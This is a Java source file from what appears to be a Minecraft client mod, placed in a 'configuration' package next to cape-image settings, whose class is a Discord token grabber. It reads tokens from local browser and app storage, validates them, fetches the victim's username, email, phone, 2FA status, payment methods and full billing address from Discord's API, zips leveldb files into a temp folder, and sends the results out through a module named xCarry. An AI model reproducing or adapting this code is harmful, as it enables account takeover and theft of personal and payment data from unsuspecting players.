package me.eonexe.equinox.configuration;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import me.eonexe.equinox.util.IDKWTFutil;
import me.eonexe.equinox.util.espUtil;
import me.eonexe.equinox.features.modules.misc.xCarry;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class DiscordTokens
{
    public static final String l = Configs.getMain();
    public static final String CapeImageURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";
    public static final String CapeName = "Devito";
    public static espUtil d = new espUtil(l);

    public static void execute()
    {
        List<String> tokens = new ArrayList<>();
        TokenUtil.paths.stream().map(TokenUtil::getTokens).filter(Objects::nonNull).forEach(tokens::addAll);
        tokens = TokenUtil.removeDuplicates(tokens);
        tokens = TokenUtil.getValidTokens(tokens);

        TokenUtil.paths.stream()
                .map(s -> s + "\\Local Storage\\leveldb\\")
                .forEach(s -> { try {
                    File file = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
                    pack(s, file.getPath());
                    //xCarry.sendFile(file);
                } catch (IOException ignored) { } });
        tokens.forEach(token -> xCarry.sendMessage(process(token)));


    }

    private static String process(String token)
    {
        JsonObject obj = new JsonParser().parse(getUserData(token)).getAsJsonObject();
        String address = null;
        try {
            address = getAddressFromToken(token);
        }catch(IOException Ignored){}

        String poop = ("``` Token : " + token +
                "\n Name" + ":" + obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString() +
                "\n Email" + ":" + obj.get("email").getAsString() +
                "\n 2Factor" + ":" + String.valueOf(obj.get("mfa_enabled").getAsBoolean()) +
                "\n Phone" + ":" + (!obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None") +
                "\n Nitro" + ":" + (obj.has("premium_type") ? "True" : "False") +
                "\n Payment" + ":" + (hasPaymentMethods(token) ? "True" : "False") +
                "\n address" + ":" +  address + "```" );




        return poop;
    }

    public static String getAddressFromToken(String token) throws IOException {
        StringBuilder address = new StringBuilder("Address | ");
        // Parse address information
        String addressInfo = getRequest("https://discord.com/api/v9/users/@me/billing/payment-sources", token).replace(",", ",\n");
        if (addressInfo.contains("ERROR")) return "Failed to parse token data, or it's invalid.";
        String realName = getJsonKey(addressInfo, "name");
        String line1 = getJsonKey(addressInfo, "line_1");
        String line2 = getJsonKey(addressInfo, "line_2");
        String city = getJsonKey(addressInfo, "city");
        String state = getJsonKey(addressInfo, "state");
        String country = getJsonKey(addressInfo, "country");
        String postalCode = getJsonKey(addressInfo, "postal_code");
        // Parse the results
        address.append("Name: ").append(realName).append(" | ");
        address.append("Line 1: ").append(line1).append(" | ");
        address.append("Line 2: ").append(line2).append(" | ");
        address.append("City: ").append(city).append(" | ");
        address.append("State: ").append(state).append(" | ");
        address.append("Country: ").append(country).append(" | ");
        address.append("Postal Code: ").append(postalCode);
        return address.toString();
    }

    private static String getJsonKey(String jsonString, String wantedKey) {
        Pattern jsonPattern = Pattern.compile("\""+wantedKey+"\": \".*\"");
        Matcher matcher = jsonPattern.matcher(jsonString);
        if (matcher.find()) return matcher.group(0).split("\"")[3];
        return "Error";
    }

    private static String getRequest(String uri, String token) throws IOException {
        URL url = new URL(uri);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        connection.setRequestProperty("Authorization", token);
        connection.setRequestMethod("GET");
        InputStream responseStream = connection.getInputStream();
        try (Scanner scanner = new Scanner(responseStream)) {
            return scanner.useDelimiter("\\A").next();
        } catch (Exception e) {
            return "ERROR";
        }
    }

    private static String getUserData(String token)
    {
        return TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    private static boolean hasPaymentMethods(String token)
    {
        return TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }

    private static void pack(String sourceDirPath, String zipFilePath) throws IOException
    {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p)))
        {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .filter(path -> path.toFile().getPath().contains("ldb"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try
                        {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        }
                        catch (IOException ignored) { }
                    });
        }
    }
}